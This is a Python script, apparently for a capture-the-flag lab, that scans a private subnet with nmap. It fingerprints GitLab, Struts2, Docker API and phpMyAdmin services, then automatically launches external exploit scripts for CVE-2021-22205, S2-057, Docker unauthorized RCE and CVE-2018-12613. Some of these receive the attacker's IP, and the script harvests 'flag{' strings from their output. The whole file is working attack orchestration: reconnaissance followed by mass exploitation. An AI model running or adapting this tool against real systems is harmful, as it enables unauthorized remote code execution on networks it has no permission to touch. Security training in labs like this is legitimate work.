import socket
import subprocess
import sys
import time
import threading
import netifaces
import re
from tabulate import tabulate
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

SERVICE_COLORS = {
    "GITLAB": Fore.BLUE,
    "DOCKER": Fore.GREEN,
    "STRUTS": Fore.YELLOW,
    "CVE": Fore.RED
}

sys.stdout.reconfigure(line_buffering=True)


def stream_output(process, prefix="", color=""):
    for line in iter(process.stdout.readline, ''):
        if line:
            print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
    process.stdout.close()

def stream_error(process, prefix="ERROR: ", color=""):
    for line in iter(process.stderr.readline, ''):
        if line:
            print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
    process.stderr.close()

subnet = '172.20.0.0/24'
vulnerable_versions = ['13.12.3']

def get_ip():
    ip_addr = None
    interfaces = netifaces.interfaces()

    for interface in interfaces:
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            for link in addresses[netifaces.AF_INET]:
                if 'addr' in link:
                    if interface == 'wlo1':
                        ip_addr = link['addr']

    return ip_addr

ip_address_attacker = get_ip()

def is_gitlab_vulnerable(version):
    for v in vulnerable_versions:
        print(f"Checking if version is vulnerable: {v}")
        if version.startswith(v):
            return True
        return False

def scan_nmap(subnet):
    print(f"[*] Scanning {subnet} for open ports...")
    try:
        result = subprocess.run(["nmap", "-p-", "--exclude", "172.20.0.254", subnet], capture_output=True, text=True)
        hosts_data = result.stdout.split("Nmap scan report for ")
        return hosts_data[1:]
    except Exception as e:
        print(f"[!] Error scanning with nmap:\n{e}")
        return []

def parse_open_ports(host_block):
    lines = host_block.strip().splitlines()
    if not lines:
        return None, []

    match = re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", lines[0])
    host_ip = match.group(1) if match else None
    open_ports = []
    for line in lines:
        if "/tcp" in line and "open" in line:
            parts = line.split()
            try:
                port = parts[0].split("/")[0]
                service = parts[2]
                open_ports.append((port, service))
            except Exception as e:
                print(f"[!] Error during parsing\n{e}")
    return host_ip, open_ports

def detect_gitlab(host_ip, port):
    print(f"[*] Checking port {port} for GitLab...")
    url = f"http://{host_ip}:{port}"
    try:
        response = subprocess.run(["curl", "-I", url], capture_output=True, text=True, timeout=5)
        headers = response.stdout
        if "GitLab" in headers:
            match = re.search(r"X-GitLab-Version:\s*(\d+\.\d+\.\d+)", headers)
            version = match.group(1) if match else "Unknown"
            if match:
                return url, version
    except Exception as e:
        print(f"[!] GitLab detection error at {url}:\n{e}")
    return None, None

def detect_struts(host_ip, port):
    print(f"[*] Checking port {port} for Struts...")
    STRUTS_PATHS = [
        "struts-showcase", "examples", "struts-examples",
        "struts2-examples", "struts2-showcase", "demo",
        "struts-demo", "struts2-demo", "showcase",
        "tutorial", "struts-tutorial", "struts2-tutorial",
        "blank", "struts2-blank", "struts-blank",
        "rest", "struts2-rest", "struts-rest",
        "convention", "struts2-convention",
        "mailreader", "struts2-mailreader",
        "portlet", "struts2-portlet"
    ]
    url = f"http://{host_ip}:{port}/"

    for path in STRUTS_PATHS:

        try:
            result = subprocess.run(["curl", url + path], capture_output=True, text=True)

            if 'struts' in result.stdout:
                print(f"Testing path: {path}")
                if path == 'struts2-showcase':
                    print(f"Vulnerable path detected: {path}")
                    return (host_ip, port, path)
        except Exception as e:
            print(e)
    return (None, None, None)


def detect_CVE_2018_12613(host_ip, port):
    print(f"[*] Checking port {port} for CVE-2018-12613")
    CVE_PATHS = ["phpmyadmin"]
    url = f"http://{host_ip}:{port}/"
    for path in CVE_PATHS:
        try:
            result = subprocess.run(["curl", url + path], capture_output=True, text=True)

            if 'Not Found' not in result.stdout and result.returncode == 0:
                print("Found phpmyadmin instance")
                print(f"Testing path: {path}")
                return (host_ip, port, path)
        except Exception as e:
            print(e)
    return (None, None, None)

def scan_and_dispatch(subnet):
    hosts_blocks = scan_nmap(subnet)
    threads = []
    exploits = []

    for host_block in hosts_blocks:

        host_ip, open_ports = parse_open_ports(host_block)
        if not host_ip or not open_ports:
            continue
        print(f"[+] Host {host_ip} has open ports: {open_ports}")
        for port, service in open_ports:
            if "docker" in service:
                exploits.append({
                    'service' : 'docker',
                    'host_ip' : host_ip,
                    'port' : port
                    })
            gitlab_url, gitlab_ver = detect_gitlab(host_ip, port)
            struts_ip, struts_port, struts_path = detect_struts(host_ip, port)
            if port == '8202':
                cve_ip, cve_port, cve_path = detect_CVE_2018_12613(host_ip, port)
                if cve_ip:
                    exploits.append({
                        'service': 'cve',
                        'host_ip' : cve_ip,
                        'port' : cve_port,
                        'path' : cve_path
                        })
            if gitlab_url:
                if is_gitlab_vulnerable(gitlab_ver):
                    exploits.append({
                        'service': 'gitlab',
                        'host_ip' : host_ip,
                        'port' : port,
                        'url' : gitlab_url,
                        'version' : gitlab_ver
                        })
            if struts_ip:
                exploits.append({
                    'service': 'struts',
                    'host_ip' : struts_ip,
                    'port' : struts_port,
                    'path' : struts_path
                    })

    print("\n[+] Detected vulnerable services:\n")
    table = []
    for e in exploits:
        row = [e['service'].upper()]
        if e['service'] == 'gitlab':
            row.extend([e['host_ip'], e['port'], e['url'], e['version']])
        elif e['service'] in ['docker', 'cve', 'struts']:
            row.extend([e['host_ip'], e['port'], e.get('path', '-')])
        table.append(row)

    headers = ["Service", "Target", "Port", "Path", "Version"]
    print(tabulate(table, headers=headers))
    print()

    with ThreadPoolExecutor(max_workers=10) as executor:
        for exploit in exploits:
            service = exploit['service']
            if service == 'docker':
                threads.append(executor.submit(launch_docker_exploit, exploit['host_ip'], exploit['port']))
            if service == 'cve':
                threads.append(executor.submit(launch_cve_exploit, exploit['host_ip'], exploit['port'], exploit['path']))
            if service == 'gitlab':
                threads.append(executor.submit(launch_gitlab_exploit, exploit['url'], exploit['version']))
            if service == 'struts':
                threads.append(executor.submit(launch_struts_exploit, exploit['host_ip'], exploit['port'], exploit['path']))
    # === Collect and print flags ===
    flags = []
    for future in as_completed(threads):
        result = future.result()
        if result:
            flags.append(result)

    print("\n=== 🏁 Flags Summary ===")
    for service, flag in flags:
        print(f"{SERVICE_COLORS.get(service.upper(), '')}{service}: {flag}{Style.RESET_ALL}")


def launch_gitlab_exploit(url, version):
    color = SERVICE_COLORS["GITLAB"]
    prefix = "GITLAB >> "
    print(f"{color}[>>>] Launching GitLab exploit against {url} (version: {version}){Style.RESET_ALL}")

    try:
        proc = subprocess.Popen(["python3", "-u", "single_step_machine/gitlab/CVE-2021-22205/scripts/exploit.py", url, ip_address_attacker],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait()

        for line in output_lines:
            if "flag{" in line:
                return ("GITLAB", line)

    except Exception as e:
        print(f"{color}[!] Error executing GitLab exploit: {e}{Style.RESET_ALL}")
    return None


def launch_docker_exploit(host_ip, port):
    url = f"http://{host_ip}:{port}"
    exploit_path="multi_step_machine/docker/unauthorized-rce/scripts/exploit.py"
    color = SERVICE_COLORS["DOCKER"]
    prefix = "DOCKER >> "
    print(f"{color}[>>>] Launching Docker exploit against: {url}{Style.RESET_ALL}")
    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, url],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait()

        for line in output_lines:
            if "flag{" in line:
                return ("DOCKER", line)
    except Exception as e:
        print(f"{color}[!] Error executing docker exploit\n{e}{Style.RESET_ALL}")
        return 1

def launch_struts_exploit(container_ip, port, path):
    color = SERVICE_COLORS["STRUTS"]
    prefix = "STRUTS >> "
    print(f"{color}[>>>] Launching Struts exploit against {container_ip}:{port}{path}{Style.RESET_ALL}")
    exploit_path = "multi_step_machine/struts2/s2-057/scripts/exploit.py"

    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, ip_address_attacker, container_ip, port, path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait()

        for line in output_lines:
            if "flag{" in line:
                return ("STRUTS", line)
    except Exception as e:
        print(f"{color}[!] Error executing struts exploit\n{e}{Style.RESET_ALL}")
        return 1

def launch_cve_exploit(container_ip, port, path):
    color = SERVICE_COLORS["CVE"]
    prefix = "CVE >> "
    print(f"{color}[>>>] Launching CVE exploit against: {container_ip}:{port} /{path}{Style.RESET_ALL}")
    exploit_path = "cves/cve-2018-12613/exploit.py"
    try:
        proc = subprocess.Popen(["python3", "-u", exploit_path, container_ip, port, path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        output_lines = []

        for line in iter(proc.stdout.readline, ''):
            if line:
                print(f"{color}{prefix}{line.strip()}{Style.RESET_ALL}")
                output_lines.append(line.strip())
        proc.stdout.close()

        stream_error(proc, prefix=prefix + "[ERR] ", color=color)
        proc.wait()

        for line in output_lines:
            if "flag{" in line:
                return ("CVE", line)

    except Exception as e:
        print(f"{color}[!] Error executing cve exploit\n{e}{Style.RESET_ALL}")
        return 1
    print("CVE thread finished")

def main():
    print("[*] Launching exploit manager...")
    scan_and_dispatch(subnet)
    print("[*] Exploit executed successfully")
if __name__=='__main__':
    main()
